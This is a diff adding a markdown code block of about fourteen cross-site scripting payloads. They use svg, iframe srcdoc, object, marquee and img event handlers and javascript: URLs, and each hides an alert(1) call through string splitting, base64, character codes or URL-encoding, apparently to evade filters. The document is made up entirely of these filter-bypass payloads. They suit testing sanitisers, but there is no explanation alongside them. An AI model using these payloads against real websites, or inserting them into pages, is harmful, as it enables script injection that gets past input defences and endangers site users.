@@ -1,0 +1,16 @@
+```html
+<svg onload=Function('return ale'+'rt')(1)>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:ale'+'rt(1)'>"></iframe>
+<object data="javascript:al%65rt(1)"></object>
+<marquee onstart=eval(atob('YWxlcnQoMSk='))></marquee>
+<iframe srcdoc='<object data="javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></object>'></iframe>
+<iframe srcdoc="<meta http-equiv='refresh' content='0;url=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>"></iframe>
+<object data="javascript:eval(unescape('%61%6C%65%72%74%28%31%29'))"></object>
+<marquee behavior=alternate onstart=Function('ale'+'rt')(1)></marquee>
+<object data="javascript:eval(atob('YWxlcnQoMSk='))"></object>
+<iframe srcdoc='<meta http-equiv="refresh" content="0;url=javascript:eval(atob(`YWxlcnQoMSk=`))">'></iframe>
+<img src=x onerror=setTimeout(Function('return ale'+'rt')(1),0)>
+<object data="javascript:setTimeout('ale'+'rt(1)',0)"></object>
+<marquee onstart=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></marquee>
+<svg onload=setTimeout(Function('ale'+'rt')(1),0)>
+```
